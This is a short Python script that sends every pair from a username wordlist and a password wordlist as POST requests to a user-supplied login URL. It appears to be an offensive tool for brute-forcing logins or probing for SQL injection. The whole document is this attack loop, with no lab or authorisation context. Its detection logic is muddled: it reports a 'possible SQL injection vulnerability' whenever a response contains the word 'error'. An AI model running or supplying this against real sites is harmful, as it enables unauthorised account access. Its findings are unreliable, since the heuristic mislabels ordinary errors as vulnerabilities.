import requests

# Prompt the user for the target URL
target_url = input('Enter the target URL: ')

# Prompt the user for the name of the file containing the data to be sent in the POST request
data_file = input('Enter the name of the file containing the data to be sent in the POST request: ')

# Read the data from the file and split it into a dictionary
with open(data_file, 'r') as f:
  data = dict(item.split('=') for item in f.read().split('&'))

# Prompt the user for the name of the file containing the list of usernames
username_file = input('Enter the name of the file containing the list of usernames: ')

# Read the list of usernames from the file
with open(username_file, 'r') as f:
  usernames = f.read().strip().split('\n')

# Prompt the user for the name of the file containing the list of passwords
password_file = input('Enter the name of the file containing the list of passwords: ')

# Read the list of passwords from the file
with open(password_file, 'r') as f:
  passwords = f.read().strip().split('\n')

# Iterate over the list of usernames and passwords
for username in usernames:
  for password in passwords:
    # Inject the username and password into the data dictionary
    data['username'] = username
    data['password'] = password

    # Send a POST request to the login form with the injected data
    response = requests.post(target_url, data=data)

    # Check the response for any indicators of a successful SQL injection attack
    if 'error' in response.text.lower():
      print(f'Possible SQL injection vulnerability found using username "{username}" and password "{password}"!')
    else:
      print(f'No SQL injection vulnerability found using username "{username}" and password "{password}".')
